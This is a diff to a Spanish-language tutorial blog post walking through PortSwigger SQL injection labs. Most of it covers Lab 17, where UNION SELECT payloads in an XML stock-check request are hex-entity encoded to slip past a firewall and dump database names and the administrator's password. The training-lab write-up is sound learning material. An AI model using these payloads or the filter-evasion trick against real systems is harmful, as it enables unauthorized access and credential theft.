@@ -585,6 +585,8 @@ Y al hacer esta petición veremos en su respuesta:
 
 ![respuesta1](/assets/images/SQLiPortswigger/lab10/respuesta1.png)
 
+> No le especificamos que registro o fila a esa tabla ya que esa tabla contiene solo una fila la cual se toma por defecto.
+
 Podemos apreciar hasta abajo que nos interpreta lo que le hemos dicho, ya que sabemos que estas columnas son tipo string, pero lo que nos interesa ahora es listar las bases de datos, por lo que haremos la siguiente consulta:
 
 `https://web-security-academy.net/filter?category=Gifts' UNION SELECT owner,'texto 2' FROM all_tables -- -`
@@ -1552,3 +1554,173 @@ Después comprueba si el tiempo inicial menos el tiempo final, quedándonos solo
 <br>
 
 Al ejecutar este script obtendremos en unos minutos la password del usuario "administrator" y habremos terminado este laboratorio.
+
+<br>
+
+# Laboratorios 15 y 16 pendientes.....
+
+<br>
+
+# Laboratorio 17: Inyección SQL con omisión de filtro a través de codificación XML
+
+![17](/assets/images/SQLiPortswigger/lab14/lab17.png)
+
+En este laboratorio nos indica que la vulnerabilidad no es de las vistas anteriormente (basada en errores, basada en respuestas condicionales, basada en errores condicionales o basada en tiempo), sino que es otro modo.
+
+Nos dice que existe una vulnerabilidad SQLi en la función de verificar existencias de productos.
+
+Cuando vamos a la página y buscamos algo que haga esa función nos encontramos con esto:
+
+![function](/assets/images/SQLiPortswigger/lab14/funcion.png)
+
+Al abrir un producto nos encontramos esta siguiente función la cual nos indica cuantos productos de ese tipo quedan.
+
+<br>
+
+Como sabemos que aquí está la vulnerabilidad vamos a interceptar la petición al darle click al botón que dice "Check stock", y recibiremos la siguiente petición:
+
+![xml](/assets/images/SQLiPortswigger/lab14/xml.png)
+
+Como vemos nos interceptó la petición del botón de verificar existencias, y vemos que nos devuelve una pequeña instrucción XML al final de la petición:
+
+```XML
+<?xml version="1.0" encoding="UTF-8"?>
+	<stockCheck>
+		<productId>
+			8
+		</productId>
+		<storeId>
+			2
+		</storeId>
+	</stockCheck>
+```
+
+Intentaremos inyectar la consulta donde está la etiqueta `<productId>`, ya que tal vez se comunique con una base de datos para obtener ese resultado, así que agregamos la consulta:
+
+```XML
+<?xml version="1.0" encoding="UTF-8"?>
+	<stockCheck>
+		<productId>
+			8 UNION SELECT NULL -- -
+		</productId>
+		<storeId>
+			2
+		</storeId>
+	</stockCheck>
+```
+
+Y al tramitar esta petición apreciamos lo siguiente en la respuesta:
+
+![attack](/assets/images/SQLiPortswigger/lab14/attack.png)
+
+Apreciamos que nos detectó que estamos intentando ejecutar nuestras consultas y nos da un mensaje del firewall que protege el sistema.
+
+<br>
+
+Una manera para evadir esto es ir a "Extensions>Bapp Store" dentro de BurpSuite, y buscaremos una extension llamada Hackvector, y nos la instalamos:
+
+![hv](/assets/images/SQLiPortswigger/lab14/hackvector.png)
+
+Una vez instalada, volveremos a el repeater de nuestra peticion y seleccionaremos nuestra consulta inyectada, osea "UNION SELECT NULL -- -" dando click derecho:
+
+"Extension>Hackvector>Encode>hex_entities"
+
+Y una vez lo hagamos se nos transformara y daremos en tramitar peticion:
+
+Nos agregara la etiqueta `<@hex_entities>` a el codigo:
+
+```XML
+<?xml version="1.0" encoding="UTF-8"?>
+	<stockCheck>
+		<productId>
+			<@hex_entities>
+				8 UNION SELECT NULL -- -
+			<@/hex_entities>
+		</productId>
+		<storeId>
+			2
+		</storeId>
+	</stockCheck>
+
+```
+
+Vemos que nos agregó esas etiquetas, ahora tramitaremos la petición y veremos:
+
+![res](/assets/images/SQLiPortswigger/lab14/response.png)
+
+Vemos que no nos muestra nada, por lo que puede que la inyección no vaya en esta etiqueta, así que otra que puede estar comunicándose con una base de datos sería `<storeId` por lo que lo cambiaremos ahí:
+
+```XML
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+	<productId>
+		8
+	</productId>
+	<storeId>
+		<@hex_entities>
+			2 UNION SELECT NULL -- -
+		<@/hex_entities>
+	</storeId>
+</stockCheck>
+
+```
+
+Y ahora en este caso podemos apreciar que ya nos responde la petición inyectada:
+
+![null](/assets/images/SQLiPortswigger/lab14/null.png)
+
+Vemos que nos dice NULL, por lo que sabemos que esta columna puede ser de tipo carácter, así que trataremos de dumpear datos, por ejemplo las bases de datos:
+
+```XML
+<?xml version="1.0" encoding="UTF-8"?>
+	<stockCheck>
+		<productId>
+			8
+		</productId>
+		<storeId>
+			<@hex_entities>
+				2 UNION SELECT schema_name FROM information_schema.schemata  -- -
+			<@/hex_entities>
+		</storeId>
+	</stockCheck>
+```
+
+Y vemos que nos responde:
+
+![dump](/assets/images/SQLiPortswigger/lab14/dump.png)
+
+Podemos apreciar que nos devolvió las bases de datos, por lo que es vulnerable, como ya nos dieron el usuario y la tabla con sus columnas simplemente enumeraremos la password para terminar este último laboratorio:
+
+```XML
+<?xml version="1.0" encoding="UTF-8"?>
+	<stockCheck>
+		<productId>
+			8
+		</productId>
+		<storeId>
+			<@hex_entities>
+				2 UNION SELECT password FROM users WHERE username='administrator' -- -
+			<@/hex_entities>
+		</storeId>
+	</stockCheck>
+```
+
+Y nos dumpeara la contraseña del usuario administrator:
+
+![password](/assets/images/SQLiPortswigger/lab14/password.png)
+
+Y podremos terminar el último laboratorio.
+
+<br>
+
+Estos fueron todos los laboratorios de esta página, pero aún faltan cosas como enumerar todas las bases de datos sin conocer ni tabla, ni columnas, ni nada, empezando desde 0, para esto podemos practicar e investigar más sobre esto en próximos posts y se recomienda aprender sobre estos recursos:
+
+<br>
+
+[Inyecciónes SQL ciegas (creditos: defendtheweb.net)](https://defendtheweb.net/article/blind-sql-injection?fbclid=IwAR1BHzkyCQGr-IciLqfxq8G7tFlJkDV71-Xgv94WDpFUQuZ_6VGM4_W4-Bc)
+
+[Maquina Cronos (creditos: s4vitar)](https://www.youtube.com/watch?v=kBw3UyBt7Hc)
+
+[Resolución de los laboratorios vistos pero en video (creditos: s4vitar)](https://www.youtube.com/watch?v=C-FiImhUviM)
+
+<br>
